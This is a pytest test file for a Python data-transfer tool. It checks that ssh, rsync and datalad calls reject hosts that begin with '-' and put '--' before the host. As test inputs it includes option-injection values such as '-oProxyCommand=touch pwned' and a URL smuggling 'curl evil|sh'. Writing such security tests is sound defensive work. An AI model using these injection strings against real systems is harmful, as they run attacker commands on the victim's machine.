"""A host/target starting with '-' must never reach ssh/rsync as an option.

`ssh -oProxyCommand=<cmd>` runs <cmd> locally, so every place that hands a
user- or project-supplied host to ssh/rsync must reject it and use `--`.
"""

from __future__ import annotations

import subprocess

import pytest

from src import datalad_doctor, remote_browse, rsync_execution
from src.ssh_safety import ssh_target_ok

EVIL = "-oProxyCommand=touch pwned"


@pytest.mark.parametrize(
    "value,ok",
    [
        ("host", True),
        ("user@host", True),
        ("user@host.example.org", True),
        ("", False),
        ("-oProxyCommand=x", False),
        ("user@-oProxyCommand=x", False),
        ("-user@host", False),
        ("ho st", False),
        ("host\n", False),
    ],
)
def test_ssh_target_ok(value, ok):
    assert ssh_target_ok(value) is ok


@pytest.fixture
def no_subprocess(monkeypatch):
    calls = []

    def boom(*a, **k):
        calls.append(a)
        raise AssertionError("subprocess must not run for an unsafe host")

    monkeypatch.setattr(subprocess, "run", boom)
    monkeypatch.setattr(subprocess, "Popen", boom)
    return calls


def test_ensure_remote_directory_rejects_option_host(no_subprocess):
    res = rsync_execution.ensure_remote_directory(f"{EVIL}:22")
    assert res["success"] is False
    assert no_subprocess == []


def test_run_rsync_push_rejects_option_target(tmp_path, no_subprocess):
    res = rsync_execution.run_rsync_push(
        tmp_path, remote_target=f"{EVIL}:/x", rsync_executable="/usr/bin/rsync"
    )
    assert res["success"] is False and res["attempted"] is False
    assert no_subprocess == []


def test_run_rsync_verify_rejects_option_target(tmp_path, no_subprocess):
    res = rsync_execution.run_rsync_verify(
        tmp_path, remote_target=f"{EVIL}:/x", rsync_executable="/usr/bin/rsync"
    )
    assert res["success"] is False
    assert no_subprocess == []


def test_remote_browse_rejects_option_host(no_subprocess):
    assert remote_browse.list_remote_directory(EVIL, "/", ssh_executable="/usr/bin/ssh")["success"] is False
    assert remote_browse.create_remote_directory(EVIL, "/x", ssh_executable="/usr/bin/ssh")["success"] is False
    assert no_subprocess == []


def test_doctor_rejects_option_host_in_url():
    ran = []
    res = datalad_doctor._check_server(
        "ssh://-oProxyCommand=curl%20evil|sh/", "/usr/bin/ssh", "", lambda cmd: ran.append(cmd) or (0, "")
    )
    assert res["ok"] is False
    assert ran == []


def _record(monkeypatch):
    seen = []

    def fake_run(cmd, **k):
        seen.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, stdout="/x\n", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    return seen


def test_valid_hosts_get_double_dash_before_host(monkeypatch):
    seen = _record(monkeypatch)
    monkeypatch.setattr("shutil.which", lambda n: f"/usr/bin/{n}")
    rsync_execution.ensure_remote_directory("me@host:/data/x y")
    remote_browse.list_remote_directory("me@host", "/")
    remote_browse.create_remote_directory("me@host", "/x")
    for cmd in seen:
        assert cmd[0].endswith("ssh") and cmd[1] == "--" and cmd[2] == "me@host", cmd
    # remote path is a single shell-quoted word, not split by the remote shell
    assert seen[0][3] == "mkdir -p -- '/data/x y'"


def test_rsync_argv_has_double_dash_before_paths(tmp_path, monkeypatch):
    seen = _record(monkeypatch)
    monkeypatch.setattr(rsync_execution, "ensure_remote_directory", lambda t: {"success": True})
    rsync_execution.run_rsync_verify(tmp_path, remote_target="me@host:/d", rsync_executable="/usr/bin/rsync")
    cmd = seen[0]
    i = cmd.index("--")
    assert cmd[i + 1].endswith("/") and cmd[i + 2] == "me@host:/d/"


def test_datalad_sibling_urls_starting_with_dash_are_rejected(tmp_path, no_subprocess):
    from src import datalad_execution as de

    plain = de.run_datalad_create_sibling_plain(
        tmp_path, remote_url="-oProxyCommand=x", datalad_executable="/usr/bin/datalad"
    )
    ria = de.run_datalad_create_sibling_ria(
        tmp_path, ria_url="-oProxyCommand=x", datalad_executable="/usr/bin/datalad"
    )
    for res in (plain, ria):
        assert res["success"] is False and res["attempted"] is False
    assert no_subprocess == []
